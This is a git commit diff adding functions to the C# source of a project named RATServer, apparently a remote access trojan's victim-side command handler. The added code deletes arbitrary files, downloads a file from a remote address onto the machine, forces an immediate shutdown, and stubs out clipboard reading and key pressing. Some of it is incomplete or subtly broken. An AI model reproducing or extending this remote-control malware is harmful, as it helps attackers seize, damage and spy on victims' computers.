c6f6ec04003ed3d48d7d62b4ace8327c49f9ca59
kylercondran@gmail.com <kylercondran@gmail.com>
2024-04-24 16:44:26 -0300

    added some more functions

--- RATServer/Functions.cs
+++ RATServer/Functions.cs
@@ -1,7 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -28,6 +30,36 @@ namespace RATServer
             foreach (Process p in Process.GetProcesses())
                 x += p.ProcessName + Environment.NewLine;
             return x;
+        }
+        public static string Delete(string Path)
+        {
+            string x;
+            if (System.IO.File.Exists(Path))
+            {
+                System.IO.File.Delete(Path);
+                x = "Delete Success";
+            } else x = "File Not Found";
+            return x;
+        }
+        public static void Download(string IP, string Path)
+        {
+            using (var c = new WebClient())
+            {
+                c.DownloadFile(IP, Path);
+            }
+        }
+        public static void ShutDown()
+        {
+            Process.Start("cmd.exe shutdown -s -f -t 00");
+        }
+        public static string ClipBoard()
+        {
+            string x = ""; //get clipboard
+            return x;
+        }
+        public static void KeyPress()
+        {
+            //press keys
         }
     }
 }
